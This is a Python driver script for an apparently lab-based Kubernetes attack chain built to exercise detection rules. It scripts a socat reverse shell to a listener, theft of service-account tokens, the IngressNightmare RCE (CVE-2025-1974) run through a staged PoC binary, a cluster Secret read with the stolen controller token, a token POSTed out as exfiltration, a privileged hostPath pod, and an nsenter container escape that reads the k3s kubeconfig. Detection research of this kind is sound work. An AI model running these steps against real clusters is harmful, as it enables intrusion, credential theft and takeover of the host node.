#!/usr/bin/env python3
"""demo_chain3 — the IKT-Linz chain over HTTPS / the ingress control plane.

Chain 3 is chain 1/2 with the protocol varied to HTTP(S) and the target varied
to the ingress-nginx controller: instead of a redis Lua escape (chain 1) or a
postgres COPY..FROM PROGRAM (chain 2), the exploit is IngressNightmare
(CVE-2025-1974) driven through the auth-url injection (CVE-2025-24514), which
gains RCE in the ingress-nginx controller pod as www-data and reads its
cluster-scoped ServiceAccount token. The step count, order and units match
chains 1/2, and steps 1-7, 9 and 18-20 are byte-identical to chain 2's shared
skeleton, so a measurement taken on chains 1/2 can be repeated here without
changing what is being measured EXCEPT the wire surface (http_events, which
neither chain 1 nor chain 2 exercises).

Only steps 08, 10, 11, 12, 13, 14, 15, 16, 17 differ from chain 2, and each says
why in its docstring. The exploit binary `ing` is built by chain3-setup.sh on
the rig and staged into the worker at step 12.

  python3 demo_chain3.py --list
  python3 demo_chain3.py --from 1 --to 20 --keep-going
"""
import argparse, json, os, re, subprocess, sys, time, urllib.request, urllib.error

ANSI = re.compile(r"\x1b\[[0-9;]*[A-Za-z]")

RAN = os.environ.get("RAN_URL", "http://localhost:8080")
RAN_CONTAINER = os.environ.get("RAN_CONTAINER", "ran-ui")
HERE = os.path.dirname(os.path.abspath(__file__))
KUBECTL = ["kubectl"]

# Chain 3's target: the ingress-nginx control plane. Kept as constants because
# the obligation spec in the dx repo matches on exactly these literals.
ING_NS = "ingress-nginx"
CTRL_SELECTOR = "app.kubernetes.io/component=controller"
ADM_SVC = "ingress-nginx-controller-admission"     # the admission webhook (:443)
ING_BIN = "/tmp/ing"                               # the IngressNightmare PoC, staged into the worker
C2_NODE = "c2/ran"
SWEEP_HOSTS = 62
CTRL_TOKEN_PATH = "/var/run/secrets/kubernetes.io/serviceaccount/token"

EXEC_ACTION = "execute-in-shell"       # NAMESPACE, POD_NAME, COMMAND, ARGS, BACKGROUND


def api(path, method="GET", body=None, timeout=120):
    req = urllib.request.Request(RAN.rstrip("/") + path,
                                 data=json.dumps(body).encode() if body is not None else None,
                                 method=method, headers={"Content-Type": "application/json"})
    try:
        with urllib.request.urlopen(req, timeout=timeout) as r:
            raw = r.read().decode()
            return r.status, (json.loads(raw) if raw.strip() else {})
    except urllib.error.HTTPError as e:
        return e.code, {"error": e.read().decode()[:400]}


def sh(cmd, timeout=180):
    p = subprocess.run(cmd, shell=True, capture_output=True, text=True, timeout=timeout)
    return p.returncode, (p.stdout or "") + (p.stderr or "")


def node_ip():
    _, out = sh("kubectl get nodes -o jsonpath='{.items[0].status.addresses[?(@.type==\"InternalIP\")].address}' | awk '{print $1}'")
    return out.strip()


def node_name():
    _, out = sh("kubectl get nodes -o jsonpath='{.items[0].metadata.name}'")
    return out.strip()


def graph():
    _, g = api("/api/graph")
    return g.get("nodes", [])


def find_node(pred):
    for n in graph():
        if pred(n):
            return n["id"]
    return None


def pod_id(ns, prefix):
    return (find_node(lambda n: n.get("kind") == "Pod"
                      and f"/{ns}/" in n["id"] and prefix in n["id"])
            or find_node(lambda n: n.get("kind") == "Pod" and prefix in n["id"]))


def sa_id(name_part):
    return find_node(lambda n: "serviceaccount" in (n.get("kind") or "").lower()
                     and name_part in n["id"])


def foothold_id():
    return find_node(lambda n: "system" in (n.get("kind") or "").lower()
                     and "operatorhost" not in (n.get("kind") or "").lower()
                     and "operator-host" not in n["id"])


# ── ingress-nginx target resolution (chain-3 specific) ───────────────────────
def ctrl_pod_id():
    """The ingress-nginx controller pod as a ran graph node. Fronted only by its
    own services, so a namespace + 'controller' match is unambiguous."""
    return find_node(lambda n: n.get("kind") == "Pod"
                     and f"/{ING_NS}/" in n["id"] and "controller" in n["id"])


def ctrl_sa_id():
    return find_node(lambda n: "serviceaccount" in (n.get("kind") or "").lower()
                     and ING_NS in n["id"])


def redis_pod_id():
    return find_node(lambda n: "pod" in (n.get("kind") or "").lower()
                     and "/oopservability/" in n["id"] and "redis" in n["id"])


def redis_sa_id():
    return find_node(lambda n: "serviceaccount" in (n.get("kind") or "").lower()
                     and "oopservability" in n["id"] and "redis" in n["id"])


def adm_clusterip():
    _, out = sh(f"kubectl -n {ING_NS} get svc {ADM_SVC} -o jsonpath='{{.spec.clusterIP}}'")
    return out.strip()


def ctrl_podip():
    _, out = sh(f"kubectl -n {ING_NS} get pod -l {CTRL_SELECTOR} "
                "-o jsonpath='{.items[0].status.podIP}'")
    return out.strip()


def executing_pod_ip():
    st, resp = api("/api/action/execute", "POST", {
        "actionId": "get-local-ip-address",
        "targetId": pod_id("agent-system", "agent-worker"),
        "reasoning": "preflight: verify execution route"})
    cmd_id = resp.get("cmdId", "") if st in (200, 202) else ""
    if not cmd_id:
        return None
    wait_for_cmd(cmd_id)
    _, out = sh(f"docker logs {RAN_CONTAINER} 2>&1 | grep -a 'Action result' "
                f"| grep -a '{cmd_id}' | tail -1")
    m = re.search(r"result_preview=([0-9.]+)", ANSI.sub("", out))
    return m.group(1) if m else None


def assert_foothold():
    want = callback_pod("status.podIP")
    got = executing_pod_ip()
    if not want:
        print("      !! no foothold pod resolved — fire the callback steps first")
        return False
    if got is None:
        print("      !! could not determine the execution route; is Ran logging?")
        return False
    if got != want:
        print(f"      !! WRONG EXECUTION ROUTE: commands land on {got}, "
              f"but the foothold is {want}")
        return False
    return True


def wait_for_cmd(cmd_id, timeout=300):
    deadline = time.time() + timeout
    while time.time() < deadline:
        _, out = sh(f"docker logs {RAN_CONTAINER} 2>&1 | grep 'Action result' "
                    f"| grep '{cmd_id}' | tail -1")
        out = ANSI.sub("", out)
        if out.strip():
            ok = "success=true" in out
            reason = ""
            if not ok and "fail_reason=" in out:
                reason = out.split("fail_reason=")[1].split("results_count")[0].strip()
            return ok, reason
        time.sleep(3)
    return False, f"no result within {timeout}s"


def callback_pod(field="metadata.name"):
    rc, out = sh("kubectl -n agent-system get pod -l task=callback-1 "
                 "--field-selector=status.phase=Running "
                 "--sort-by=.metadata.creationTimestamp "
                 "-o jsonpath='{.items[*]." + field + "}'")
    if rc != 0:
        return ""
    return (out.split() or [""])[-1]


_EXEC_SYSTEM = {}


def exec_system():
    pod = callback_pod()
    if not pod:
        return None
    if pod in _EXEC_SYSTEM:
        return _EXEC_SYSTEM[pod]
    route = C2_NODE
    st, g = api("/api/graph")
    if st != 200:
        print(f"      !! could not read the ran graph (HTTP {st}); routing via {C2_NODE}")
    elif f'"system/{pod}"' in json.dumps(g):
        route = f"system/{pod}"
    _EXEC_SYSTEM[pod] = route
    print(f"      exec route: {route}")
    return route


def foothold_system():
    pod = callback_pod()
    return f"system/{pod}" if pod else None


def execute(action, target, args=None, note="", expect_fail=False, exec_timeout=None,
            auth=None, exec_sys=None):
    if not target:
        print("      !! no target resolved")
        return bool(expect_fail)
    body = {"actionId": action, "targetId": target, "reasoning": note or action}
    if auth:
        body["authIdentityId"] = auth
    if exec_sys:
        body["execSystemId"] = exec_sys
    if args:
        body["args"] = {k: str(v) for k, v in args.items()}
    if exec_timeout:
        body["executionTimeoutSeconds"] = exec_timeout
    st, resp = api("/api/action/execute", "POST", body)
    if st not in (200, 202) or not resp.get("success", True):
        print(f"      -> HTTP {st} {json.dumps(resp)[:200]}  [REJECTED]")
        return bool(expect_fail)
    cmd_id = resp.get("cmdId", "")
    ok, reason = wait_for_cmd(cmd_id) if cmd_id else (True, "")
    verdict = "EXPECTED-FAIL" if (expect_fail and not ok) else ("OK" if ok else "FAIL")
    print(f"      -> {cmd_id} {'success' if ok else 'failed: ' + reason}  [{verdict}]")
    return ok


def worker_exec(command, args, note, expect_fail=False):
    """Run a command IN THE WORKER through Ran's generic executor. Same machinery
    as chain 2; chain 3 uses it to run curl (the HTTPS recon) and the `ing`
    exploit binary against the ingress control plane. The IngressNightmare RCE
    and its IoCs land on the CONTROLLER pod (node-agent watches it), exactly as
    chain 2's pgsql evidence lands server-side on the postgres pod."""
    pod = callback_pod()
    if not pod:
        print("      !! no worker pod to execute in")
        return False
    return execute(EXEC_ACTION, pod_id("agent-system", "agent-worker"),
                   {"NAMESPACE": "agent-system", "POD_NAME": pod,
                    "COMMAND": command, "ARGS": args, "BACKGROUND": "false"},
                   note, expect_fail=expect_fail, exec_sys=exec_system())


def worker_sh(script, note, expect_fail=False):
    """Run a shell SCRIPT in the worker. Same quoting contract as chain 2:
    single-quote wrapper, $ escaped, embedded single quotes closed/reopened."""
    esc = script.replace("'", "'\\''").replace('"', '\\"').replace("$", "\\$")
    return worker_exec("sh", f"-c '{esc}'", note, expect_fail=expect_fail)


# ── the scripted demo (unit -> steps) ────────────────────────────────────────
def step_01_listener(ctx):
    """unit-2/1: Create Listener (1337). Identical to chain 1/2."""
    return execute("create-listener", "c2/ran",
                   {"LHOST": "0.0.0.0", "PORT": "1337", "PROTOCOL": "tcp"},
                   "unit-2: create reverse-shell listener")


def step_02_spawn_worker(ctx):
    """unit-2/2: orchestrator deploys a worker pod that socat's back. Identical."""
    ip = node_ip()
    ctx["lhost"] = ip
    payload = json.dumps({
        "id": "callback-1",
        "repo": "https://github.com/Magier/ikt26",
        "cmd": f"apt update; apt install -y socat; socat TCP:{ip}:1337 EXEC:sh ",
    })
    rc, out = sh(f"curl -sS -X POST http://{ip}:30080/tasks -H 'Content-Type: application/json' -d '{payload}'")
    print(f"      -> {out.strip()[:200]}")
    return rc == 0


def step_03_await_callback(ctx):
    """unit-2/3: wait for the worker to connect back. Identical."""
    deadline = time.time() + 900
    while time.time() < deadline:
        fh = foothold_id()
        if fh:
            print(f"      -> callback caught: {fh}")
            ctx["foothold"] = fh
            return True
        ph = callback_pod("status.phase") or "<none>"
        print(f"      ... pod={ph} waiting for callback")
        time.sleep(15)
    return False


def step_04_read_env(ctx):
    """unit-2/4: Discovery > Read Environment variables. Identical."""
    tgt = foothold_id() or pod_id("agent-system", "agent-worker")
    return execute("read-environment-variables", tgt, note="unit-2: orient")


def step_05_read_sa_token(ctx):
    """unit-3/1: Read ServiceAccount Token. Identical."""
    return execute("read-service-account-token", pod_id("agent-system", "agent-worker"),
                   note="unit-3: steal worker SA token")


def step_06_install_kubectl(ctx):
    """unit-3/2: Install kubectl. Identical."""
    return execute("install-kubectl", pod_id("agent-system", "agent-worker"),
                   note="unit-3: drop kubectl")


def step_07_check_worker_token(ctx):
    """unit-3/3-4: Check Token permissions. Identical."""
    return execute("check-token-permissions", sa_id("agent-worker") or pod_id("agent-system", "agent-worker"),
                   note="unit-3: enumerate (expected: nothing useful)")


def step_08_install_httpclient(ctx):
    """unit-4/2: Install Package — DIFFERS: curl, not dig/nmap.

    Chain 1 installs nmap, chain 2 dnsutils; chain 3 installs curl for the HTTPS
    recon of the ingress control plane. install-package's verdict is ignored for
    the same reason as chains 1/2 (apt's trailing libc trigger line reads as
    failure while the binary lands); the binary is what the next step needs."""
    if not assert_foothold():
        return False
    execute("install-package", pod_id("agent-system", "agent-worker"),
            {"PKG": "curl"}, "unit-4: install curl")
    if not worker_sh("command -v curl", "unit-4: is curl in place?"):
        print("      !! curl not confirmed; step 10 is the real signal")
    return True


def step_09_local_ip(ctx):
    """unit-4/3: Get local IP address. Identical."""
    ok = execute("get-local-ip-address", pod_id("agent-system", "agent-worker"),
                 note="unit-4: need a range")
    ip = callback_pod("status.podIP")
    if ip:
        ctx["scan_cidr"] = ".".join(ip.split(".")[:3]) + ".0/24"
    return ok


def step_10_ingress_recon(ctx):
    """unit-4/4: DIFFERS — an HTTPS recon of the ingress control plane instead of
    a DNS/nmap sweep. This is the new wire surface: http_events.

    Resolves the admission webhook clusterIP (:443) and the controller pod IP,
    then probes them over HTTP(S) from the worker so the request lands as
    http_events attributed to the controller. The controller's own config
    endpoint (:10246/configuration/backends) is the inbound endpoint the signed
    SBoB declares, so a probe of it is exactly the 'unexpected ingress traffic'
    R0012 baseline-deviation the demo raises."""
    if not assert_foothold():
        return False
    adm = adm_clusterip()
    podip = ctrl_podip()
    ctx["adm_ip"], ctx["ctrl_ip"] = adm, podip
    if not (adm and podip):
        print(f"      !! could not resolve ingress targets (adm={adm!r} ctrl={podip!r})")
        return False
    print(f"      ingress targets: admission={adm}:443  controller={podip}:80")
    # Served requests are captured at the ECHO BACKEND (ing-demo/echo:5678), not the controller
    # (control-plane TLS is untraced), so the recon that grounds ingress-recon is a request routed
    # THROUGH the ingress to echo.local. The adm:443/ctrl:80 probes stay as recon but their
    # http_events land encrypted/untraced; the Host: echo.local request is the traced one.
    probe = (f'curl -sk -o /dev/null -w "adm:%{{http_code}}\\n" https://{adm}:443/ ; '
             f'curl -s  -o /dev/null -w "ctrl:%{{http_code}}\\n" http://{podip}:80/ ; '
             f'for i in 1 2 3; do curl -s -o /dev/null -w "echo:%{{http_code}}\\n" -H "Host: echo.local" http://{podip}/ ; done')
    return worker_sh(probe, f"unit-4: HTTPS recon + served requests through the ingress ({adm}, {podip} -> echo.local)")


def step_11_rce_fail(ctx):
    """unit-5/1: RCE before the exploit tool exists — FAILS. Chain 1 fails for
    want of redis-cli, chain 2 for want of psql; chain 3 fails for want of the
    IngressNightmare PoC (a bare curl to the admission webhook is rejected as an
    unauthenticated / malformed AdmissionReview)."""
    adm = ctx.get("adm_ip") or adm_clusterip()
    return worker_sh(
        f'curl -sk -X POST https://{adm}:443/networking/v1/ingresses '
        f'-H "Content-Type: application/json" -d "{{}}"',
        "unit-5: ingress RCE before the exploit tool (expected fail)",
        expect_fail=True) or True


def step_12_stage_exploit(ctx):
    """unit-5/2: Stage the IngressNightmare PoC — DIFFERS from installing a
    datastore client. `ing` is a Go binary built by chain3-setup.sh on the rig
    (git clone Esonhugh/ingressNightmare-CVE-2025-1974-exps; go build). The
    driver copies it into the worker via kubectl cp, which is how an attacker
    with a foothold + kubectl (steps 5-6) drops a tool. Falls back to fetching a
    prebuilt binary if the rig build is served."""
    pod = callback_pod()
    if not pod:
        print("      !! no worker pod")
        return False
    local = os.path.join(HERE, "ein", "ing")
    if os.path.exists(local):
        rc, out = sh(f"kubectl -n agent-system cp {local} {pod}:{ING_BIN}")
        if rc == 0:
            worker_sh(f"chmod +x {ING_BIN}", "unit-5: make ing executable")
            print(f"      -> staged {local} -> {pod}:{ING_BIN}")
        else:
            print(f"      !! kubectl cp failed: {out.strip()[:160]}")
    else:
        print(f"      !! {local} not built by chain3-setup.sh; step 13 will check for a prestaged {ING_BIN}")
    ok = worker_sh(f"test -x {ING_BIN}", "unit-5: is the ing exploit in place?")
    if not ok:
        print("      !! ing not confirmed; step 13 is the real signal")
    return True


def step_13_ingress_nightmare(ctx):
    """unit-5/4: DIFFERS — IngressNightmare CVE-2025-1974 via the auth-url
    injection (CVE-2025-24514), the chain-3 counterpart of chain 1's redis Lua
    escape and chain 2's COPY..FROM PROGRAM. Same position, same foothold,
    HTTP(S) on the wire.

    `ing -m c -c '<cmd>' -i https://<adm>:443 -u http://<ctrl>:80 --is-auth-url`
    runs the command in the controller pod as www-data via a shared object the
    controller loads from /proc/<pid>/fd during `nginx -t`. That /proc read is
    the documented IngressNightmare signature (R0002); the injected nginx-cfg
    temp files and the out-of-baseline traffic (R0012) corroborate. Proves
    execution with `id`, like chains 1/2."""
    adm = ctx.get("adm_ip") or adm_clusterip()
    podip = ctx.get("ctrl_ip") or ctrl_podip()
    if not (adm and podip):
        print("      !! ingress targets unresolved")
        return False
    return worker_sh(
        f"{ING_BIN} -m c -c 'id' -i https://{adm}:443 -u http://{podip}:80 --is-auth-url",
        "unit-5: IngressNightmare RCE via auth-url injection")


def step_14_read_ctrl_token(ctx):
    """unit-5/5: read the controller's SA token through the RCE. Chain 1/2 read
    the specimen's token through their RCE; chain 3 reads the ingress-nginx
    controller token, which is cluster-scoped (Secret read across namespaces)."""
    adm = ctx.get("adm_ip") or adm_clusterip()
    podip = ctx.get("ctrl_ip") or ctrl_podip()
    return worker_sh(
        f"{ING_BIN} -m c -c 'cat {CTRL_TOKEN_PATH}' -i https://{adm}:443 -u http://{podip}:80 --is-auth-url",
        "unit-5: read the controller SA token through the RCE")


def step_15_check_ctrl_token(ctx):
    """unit-5/6: check the stolen controller token's permissions. Carries chains
    1/2's known delta: the controller SA does not enter the ran graph as an auth
    identity without a TTP that ingests it, so this may fall through. Unit-5's
    payoff is Part 2 (the cluster Secret read)."""
    pod = ctrl_pod_id()
    sa = ctrl_sa_id()
    if sa and pod and execute("check-token-permissions", pod,
                              note="unit-5/6: stolen controller token perms",
                              auth=sa, exec_sys=foothold_system()):
        return True
    print("      not groundable locally (known delta, same as chains 1/2) -> continuing to Part 2")
    return True


def step_16_read_cluster_secret(ctx):
    """unit-5 part2/2: abuse the controller's cluster-scoped token to read a
    Secret from the apiserver over HTTPS — the chain-3 analog of chain 1/2's
    CVE-2026-4770x ServiceMonitor leak. The wire evidence is the apiserver
    request carrying the bearer token (http_events / key-material-on-wire), and
    the privilege abuse is a cross-namespace Secret read the worker SA cannot do
    but the controller SA can."""
    adm = ctx.get("adm_ip") or adm_clusterip()
    podip = ctx.get("ctrl_ip") or ctrl_podip()
    # Read a Secret list from the apiserver using the controller token, from
    # inside the controller pod (where the token and CA are mounted).
    cmd = ("T=$(cat " + CTRL_TOKEN_PATH + "); "
           "curl -sk -H \"Authorization: Bearer $T\" "
           "https://kubernetes.default.svc/api/v1/secrets?limit=5")
    return worker_sh(
        f"{ING_BIN} -m c -c '{cmd}' -i https://{adm}:443 -u http://{podip}:80 --is-auth-url",
        "unit-5: read cluster Secrets with the controller token (privilege abuse)")


def step_17_exfil_token(ctx):
    """unit-5 part2/3: exfiltrate a stolen SA token over the wire — the chain-3
    key-material-on-wire, on http_events. Mirrors chains 1/2 step 17: the
    credential leaves on the wire where the obligation matches it.

    Runs from the WORKER, POSTing straight to the echo backend SERVICE
    (plaintext, a dx-traced pod), so the JWT lands in req_body on ing-demo/echo.
    Rounds 2-3 routed this through the RCE-in-controller (curl as www-data,
    self-proxied to echo): round 2 the nested worker_sh/ing shells ate $T; round
    3 --data-binary fixed that but the census showed ZERO POST rows captured (the
    RCE shell couldn't read the token file and/or the controller->controller->echo
    self-proxy never reached the traced backend). The worker owns its mounted SA
    token (a stolen credential, read at step 5); --data-binary reads it straight
    into the POST body (no shell var). NOTE: no -w/single-quoted flags — worker_sh + ran's
    outer shell mangle nested single quotes (proven: the bare curl captures, the -w'd one didn't)."""
    return worker_sh(
        "curl -s -o /dev/null -X POST "
        "http://echo.ing-demo.svc.cluster.local:5678/ "
        "--data-binary @/var/run/secrets/kubernetes.io/serviceaccount/token",
        "unit-5: exfiltrate a stolen SA token over the wire to the echo backend")

def orchestrator_identity():
    """The identity to attribute the privileged deploy to. Chain 3 reuses chain
    2's resolution: the stolen orchestrator ServiceAccount if a TTP ingested it,
    else None (fail closed with a clear message rather than a fabricated id).

    NOTE for the k3s1 test: chain 3's unique payoff is the controller RCE + its
    cluster token, not the orchestrator extraction, so unless an identity was
    ingested this returns None and steps 18-20 fail-closed. Whether the
    controller SA itself can drive deploy-container (create a privileged pod) is
    a test question — the controller SA has Secret read but typically not
    pod-create, so 18-20 may legitimately show 'no identity' here. That is a real
    result about chain-3's blast radius, not a driver bug."""
    for pick in (lambda n: "serviceaccount" in (n.get("kind") or "").lower()
                 and "agent-orchestrator" in n["id"],
                 lambda n: "serviceaccount" in (n.get("kind") or "").lower()
                 and "orchestrator" in n["id"]):
        if nid := find_node(pick):
            return nid
    sas = [n["id"] for n in graph()
           if "serviceaccount" in (n.get("kind") or "").lower()]
    print("      !! no orchestrator SERVICE ACCOUNT in the ran graph")
    print(f"      service accounts present: {', '.join(sorted(sas)) or 'none'}")
    return None


def step_graft_arm(ctx):
    """unit-5b: pivot — arm CVE-2026-47701. ServiceMonitor w/ bearerTokenFile →
    target-allocator injects the sidecar → it leaks the agent-orchestrator token
    into oopservability-redis. This is what makes 18-20's identity ingestable;
    chain-3's ingress RCE alone cannot produce a Ran-auth identity (controller
    has no exec channel)."""
    execute("install-package", pod_id("agent-system", "agent-worker"),
            {"PKG": "redis-tools"}, "unit-5b: install redis-cli for the token extract")
    sa = redis_sa_id()
    if sa and execute("create-servicemonitor-bearer-token-file", sa,
                      note="unit-5b: CVE-2026-47701 arm the leak",
                      auth=sa, exec_sys=exec_system()):
        pass
    else:
        print("      TTP not groundable locally -> creating the ServiceMonitor CR directly")
        sm = ('apiVersion: monitoring.coreos.com/v1\nkind: ServiceMonitor\n'
              'metadata:\n  name: redis-metrics\n  namespace: oopservability\n'
              '  labels:\n    app.kubernetes.io/component: redis-metrics\n'
              'spec:\n  selector:\n    matchLabels:\n      app.kubernetes.io/name: redis-metrics\n'
              '  endpoints:\n    - port: http\n      path: /collect\n      interval: 5s\n'
              '      bearerTokenFile: /var/run/secrets/kubernetes.io/serviceaccount/token\n')
        open("/tmp/sm.yaml", "w").write(sm)
        rc, out = sh("kubectl apply -f /tmp/sm.yaml"); print("      ->", out.strip()[:120])
        if rc != 0: return False
    print("      waiting for the sidecar to leak its token into redis...")
    for _ in range(24):
        time.sleep(10)
        _, v = sh("kubectl -n oopservability exec "
                  "$(kubectl -n oopservability get pod -l app.kubernetes.io/name=oopservability-redis "
                  "-o jsonpath='{.items[0].metadata.name}') -c redis -- "
                  "redis-cli --raw GET 'oopservability:receiver:last-authorization'")
        if "Bearer" in v:
            print("      -> leaked orchestrator token present in redis key"); return True
    print("      -> redis key still empty"); return False


def step_graft_extract(ctx):
    """unit-5b: extract & INGEST the agent-orchestrator token via CVE-2026-47701.
    rawServiceaccountToken registers it as an auth identity, so orchestrator_identity()
    (unchanged) now resolves an INGESTED, auth-capable node for 18-20."""
    return execute("extract-serviceaccount-token-via-cve-2026-47701", redis_pod_id(),
                   note="unit-5b: harvest agent-orchestrator token from redis key",
                   exec_sys=foothold_system())


def step_18_check_captured(ctx):
    """unit-6/1: Check Token Permissions on the captured token. Identical to chain 2."""
    tgt = orchestrator_identity()
    if not tgt:
        return False
    return execute("check-token-permissions", tgt, note="unit-6: can create pods/jobs",
                   auth=tgt, exec_sys=foothold_system())


def step_19_deploy_privileged(ctx):
    """unit-6/2-3: Deploy Container — socat callback + hostPath mount. Identical to chain 2."""
    lhost = ctx.get("lhost") or node_ip()
    tgt = orchestrator_identity()
    if not tgt:
        print("      !! cannot deploy the privileged pod without an identity to "
              "attribute it to; steps 19 and 20 will produce no evidence")
        return False
    return execute("deploy-container", tgt,
                   {"LISTENER_REF": "listener/tcp/1337",
                    "LISTENER": lhost, "LISTENER_PORT": "1337",
                    "PodName": "ran-privileged", "Namespace": "agent-system",
                    "ServiceAccount": "default", "NodeName": node_name(),
                    "HostPID": "true", "HostIPC": "false", "HostNetwork": "false",
                    "Arguments": f'["TCP:{lhost}:1337", "EXEC:sh"]',
                    "HostPath": "/", "Mount": "/host", "Privileged": "true",
                    "Image": "alpine/socat"},
                   "unit-6: attacker-controlled privileged worker",
                   auth=tgt, exec_sys=foothold_system())


def step_20_escape_and_loot(ctx):
    """unit-7: enter the host env, prove the node, read the k3s credential.
    BOUNDED (nsenter + single k3s.yaml read, no whole-fs grep). Identical to chain 2."""
    priv = "ns/agent-system/pod/ran-privileged"
    ok = execute("escape-container-via-nsenter", priv,
                 {"TARGET": "1", "CMD": "hostname"},
                 "unit-7/1: enter host env, prove the node")
    read = execute("read-sensitive-file", priv,
                   {"MOUNT_PATH": "/host", "PATH": "/etc/rancher/k3s/k3s.yaml"},
                   "unit-7/2: read k3s kubeconfig")
    return ok and read


STEPS = [
    ("unit-2", "create listener (1337)", step_01_listener),
    ("unit-2", "spawn callback worker pod", step_02_spawn_worker),
    ("unit-2", "await socat callback", step_03_await_callback),
    ("unit-2", "read environment variables", step_04_read_env),
    ("unit-3", "read worker SA token", step_05_read_sa_token),
    ("unit-3", "install kubectl", step_06_install_kubectl),
    ("unit-3", "check worker token perms", step_07_check_worker_token),
    ("unit-4", "install curl", step_08_install_httpclient),
    ("unit-4", "get local IP", step_09_local_ip),
    ("unit-4", "HTTPS recon of the ingress control plane", step_10_ingress_recon),
    ("unit-5", "ingress RCE before exploit tool (expected fail)", step_11_rce_fail),
    ("unit-5", "stage IngressNightmare PoC (ing)", step_12_stage_exploit),
    ("unit-5", "IngressNightmare RCE (auth-url injection)", step_13_ingress_nightmare),
    ("unit-5", "read controller SA token via RCE", step_14_read_ctrl_token),
    ("unit-5", "check controller token perms", step_15_check_ctrl_token),
    ("unit-5", "read cluster Secrets with controller token", step_16_read_cluster_secret),
    ("unit-5", "exfiltrate controller token over the wire", step_17_exfil_token),
    ("unit-5b", "arm CVE-2026-47701 ServiceMonitor leak", step_graft_arm),
    ("unit-5b", "extract & ingest orchestrator token", step_graft_extract),
    ("unit-6", "check captured token perms", step_18_check_captured),
    ("unit-6", "deploy privileged container", step_19_deploy_privileged),
    ("unit-7", "escape to host + loot", step_20_escape_and_loot),
]


def main():
    ap = argparse.ArgumentParser()
    ap.add_argument("--list", action="store_true")
    ap.add_argument("--only", type=int)
    ap.add_argument("--from", dest="start", type=int, default=1)
    ap.add_argument("--to", dest="end", type=int, default=len(STEPS))
    ap.add_argument("--reset", action="store_true")
    ap.add_argument("--no-frames", action="store_true")
    ap.add_argument("--keep-going", action="store_true",
                    help="attempt every step even after one fails (a scored cell wants all 20 attempted)")
    a = ap.parse_args()

    if a.list:
        for i, (u, d, _) in enumerate(STEPS, 1):
            print(f"  {i:2d}. [{u}] {d}")
        return
    if a.reset:
        print("campaign reset:", api("/api/campaign/reset", "POST", {})[0])
        time.sleep(2)

    lo, hi = (a.only, a.only) if a.only else (a.start, a.end)
    ctx, results = {}, []
    for i, (unit, desc, fn) in enumerate(STEPS, 1):
        if not (lo <= i <= hi):
            continue
        print(f"\n[{i:2d}/{len(STEPS)}] {unit}: {desc}")
        try:
            ok = fn(ctx)
        except Exception as e:
            ok = False
            print(f"      !! {type(e).__name__}: {e}")
        results.append((i, unit, desc, ok))
        if not ok and not a.keep_going:
            print(f"      STOP: step {i} did not succeed")
            break
        if not ok:
            print(f"      step {i} did not succeed — continuing (--keep-going)")

    print("\n=== summary ===")
    for i, u, d, ok in results:
        print(f"  {i:2d}. [{u}] {d:44s} {'OK' if ok else 'FAILED'}")
    attempted = len(results); failed = [i for i, _, _, ok in results if not ok]
    print(f"\n  attempted {attempted}/{len(STEPS)}" + (f", failed {failed}" if failed else ", all OK"))
    if attempted < len(STEPS):
        print("  NOT A COMPLETE RUN — unattempted steps' obligations have no evidence.")


if __name__ == "__main__":
    main()
